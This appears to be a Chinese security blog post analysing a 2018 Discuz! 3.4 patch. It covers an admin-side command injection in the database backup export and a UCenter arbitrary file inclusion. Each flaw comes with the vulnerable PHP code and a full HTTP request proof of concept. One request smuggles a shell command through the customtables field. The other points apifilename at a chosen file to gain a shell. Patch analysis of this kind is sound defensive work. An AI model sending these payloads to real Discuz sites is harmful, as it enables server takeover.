# discuz3.4补丁更新分析

* 5月29日discuz3.4源码提交了一次更新[https://gitee.com/ComsenzDiscuz/DiscuzX/commit/f759f176c45c08be5141a677123c167f4a1b3e14](https://gitee.com/ComsenzDiscuz/DiscuzX/commit/f759f176c45c08be5141a677123c167f4a1b3e14)，其中修复了一个后台任意文件包含漏洞和一个后台命令执行隐患。
下面从代码分析漏洞：

1.后台命令执行隐患(不具备利用条件)
----
![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/命令执行1.jpg)
如图所示，问题出在后台数据库备份功能，增加了escapeshellarg()函数来过滤 $tablesstr参数。
![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/数据库备份.jpg)
/discuz3.4/upload/source/admincp/admincp_db.php
```php
if($operation == 'export') {

    $_SERVER['REQUEST_METHOD'] = 'POST';
    if(!submitcheck('exportsubmit')) {

        #省略

    }
    else {

        DB::query('SET SQL_QUOTE_SHOW_CREATE=0', 'SILENT');

        if(!$_GET['filename'] || !preg_match('/^[\w\_]+$/', $_GET['filename'])) {
            cpmsg('database_export_filename_invalid', '', 'error');
        }

        $time = dgmdate(TIMESTAMP);
        if($_GET['type'] == 'discuz' || $_GET['type'] == 'discuz_uc') {
            $tables = arraykeys2(fetchtablelist($tablepre), 'Name');
        } elseif($_GET['type'] == 'custom') {
            $tables = array();
            if(empty($_GET['setup'])) {
                $tables = C::t('common_setting')->fetch('custombackup', true);
            } else {
                C::t('common_setting')->update('custombackup', empty($_GET['customtables'])? '' : $_GET['customtables']);
                $tables = & $_GET['customtables'];####输入可控点
            }
            if( !is_array($tables) || empty($tables)) {
                cpmsg('database_export_custom_invalid', '', 'error');
            }
        }

        #省略

        if($_GET['method'] == 'multivol') {
            #省略
        }
        else {
            $tablesstr = '';
            foreach($tables as $table) {
                $tablesstr .= '"'.$table.'" ';
            }

            require DISCUZ_ROOT . './config/config_global.php';
            list($dbhost, $dbport) = explode(':', $dbhost);
            $query = DB::query("SHOW VARIABLES LIKE 'basedir'");
            list(, $mysql_base) = DB::fetch($query, DB::$drivertype == 'mysqli' ? MYSQLI_NUM : MYSQL_NUM);

            $dumpfile = addslashes(dirname(dirname(__FILE__))).'/'.$backupfilename.'.sql';
            @unlink($dumpfile);

            $mysqlbin = $mysql_base == '/' ? '' : addslashes($mysql_base).'bin/';

            @shell_exec($mysqlbin.'mysqldump --force --quick '.($db->version() > '4.1' ? '--skip-opt --create-options' : '-all').' --add-drop-table'.($_GET['extendins'] == 1 ? ' --extended-insert' : '').''.($db->version() > '4.1' && $_GET['sqlcompat'] == 'MYSQL40' ? ' --compatible=mysql40' : '').' --host="'.$dbhost.($dbport ? (is_numeric($dbport) ? ' --port='.$dbport : ' --socket="'.$dbport.'"') : '').'" --user="'.$dbuser.'" --password="'.$dbpw.'" "'.$dbname.'" '.$tablesstr.' > '.$dumpfile);
```
$_GET['customtables'] >> $tables >> $tablesstr 
参数没有经过过滤、转义直接拼接到shell_exec中可被利用命令执行

利用构造POC：
```
POST /discuz3.4/upload/admin.php?action=db&operation=export&setup=1 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 T+Browser/2.3.3.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://localhost/discuz-3.4/upload/admin.php?action=db&operation=export
Content-Type: application/x-www-form-urlencoded
Content-Length: 201
Cookie:  略
Connection: close
Upgrade-Insecure-Requests: 1

formhash=40d81b28&scrolltop=&anchor=&type=custom&customtables%5B%5D=`touch /tmp/1.txt`&method=test&sizelimit=2048&extendins=0&sqlcompat=&usehex=1&usezip=0&filename=180608_gJjGo26K&exportsubmit=%E6%8F%90%E4%BA%A4
```
几个注意点：
/discuz3.4/upload/source/class/discuz/discuz_application.php 248
```php 
if($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST)) {
    $_GET = array_merge($_GET, $_POST);#合并键值，用post覆盖get
}
```
* $_GET包含了$_POST的值
* method不能为multivol

然而上面的命令并不能执行成功，当时我有点无语，因为下面的代码有问题，这块功能代码居然是不能用的。
```php
list(, $mysql_base) = DB::fetch($query, DB::$drivertype == 'mysqli' ? MYSQLI_NUM : MYSQL_NUM);
#DB::$drivertype不存在,根据代码意思应该是$db->drivertype或者DB::$db->drivertype
```
漏洞代码运行到这里的时候会运行不下去，因为DB::$drivertype这个参数根本没定义。
在/discuz3.4/upload/source/class/discuz/discuz_database.php里class discuz_database {} 不存在$drivertype。
为了复现漏洞，我在/discuz3.4/upload/source/class/discuz/discuz_database.php 添加了public static $drivertype;，然后再使用上面的POC成功执行了命令。

2.后台任意文件包含漏洞(ucenter应用管理权限)
----
漏洞存在多处，但是原因都是一样的，就是$apifilename参数未做过滤或转义导致任意文件包含，我选择其中一处分析。
/discuz3.4/upload/uc_server/model/note.php
```php
$apifilename = isset($app['apifilename']) && $app['apifilename'] ? $app['apifilename'] : 'uc.php';
        if($app['extra']['apppath'] &&  @include_once $app['extra']['apppath'].'./api/'.$apifilename) {
```
分析下$apifilename的值从哪里来

/discuz3.4/upload/uc_server/data/cache/apps.php >> /discuz3.4/upload/uc_server/model/base.php init_cache() >> $this->base->cache('apps') >> $app['apifilename']

apps.php的值如下图所示
![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/apps.php.jpg)
可通过ucenter的应用管理进行控制
![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/Jietu20180612-192102.jpg)
POC：
```php
POST /discuz3.4/upload/uc_server/admin.php?m=app&a=detail&appid=1 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 T+Browser/2.3.3.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://localhost/discuz3.4/upload/uc_server/admin.php?m=app&a=detail&appid=1&sid=bdb72eMi%2BnWQ0q9oCK46R%2BA80gB%2BQ4ZRCIiuPWiNu2FCVNQbKb%2F2FtI4XRDYgsU9VvGBY07LF2exdg
Content-Type: application/x-www-form-urlencoded
Content-Length: 405
Cookie: 略
Connection: close
Upgrade-Insecure-Requests: 1

sid=87c1Zk21dOZPwMBkwqz%2BmgKKVA%2FrhGZKGqu1CWAP63EzBMLJWaCtv9K1DPs%2B61zf7vEER6usLasOpQ&formhash=c98254e0423cf9af&type=DISCUZX&name=Discuz%21+Board&url=http%3A%2F%2Flocalhost%2Fdiscuz-3.4%2Fupload&extraurl=&ip=&authkey=SfU517M8n8u1scR1T255Gea6G909L2l338E6seAdP7xei3U0yag9J3gfm6iey66b&apppath=..%2F&viewprourl=&apifilename=../phpinfo.txt&tagtemplates=&tagfields=&synlogin=1&recvnote=1&submit=+%E6%8F%90+%E4%BA%A4+
```
* apppath=..%2F 如果不知道绝对路径，输入../会自动生成,这里只能填存在的路径且和./api/uc.php拼接文件存在，discuz3.4/upload/uc_server/control/admin/app.php的157行
* 伪协议也不能用，discuz3.4/upload/uc_server/control/admin/app.php的155行realpath()函数过滤。
![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/绝对路径.jpg)
* apifilename= 可以是上传的图片(不能是经过GB库处理的)、附件等，填入相对路径(discuz
前台不会返回上传文件路径，必须通过admin后台上传),这里phpinfo.txt是我创建在web根目录的测试文件。
* 更新的修复代码也很自信，apifilename参数限制了只能为php后缀的文件，我认为修复的不够保险，可以写死为uc.php。

POC的包发完以后，访问登陆页面、ucenter首页等多处都包含了指定的文件，达到getshell的目的。
![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/Jietu20180612-191327.jpg)
